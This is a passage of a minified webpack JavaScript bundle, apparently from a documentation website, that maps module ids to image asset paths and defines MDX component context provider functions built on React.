t=s.p+"assets/images/image_20250323-152319-feb64307803d78dc5d8928a1963476db.png"},50886:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20250324-152445-34fe6f662c155bf10fb545dc574ddd64.png"},54811:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20250326-152631-3a6e6ea118e2089692775b5f9aead788.png"},67532:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20250327-152727-c50e952c1b4b065f5f5f268134ba8209.png"},35541:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20250341-154153-5c9e5ea6b95f2c6c022034a450e963da.png"},89315:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20250342-154226-0fd78953fd59df1a000c332e6b493098.png"},28453:(e,n,s)=>{s.d(n,{R:()=>r,x:()=>o});var t=s(96540);const i={},a=t.createContext(i);function r(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);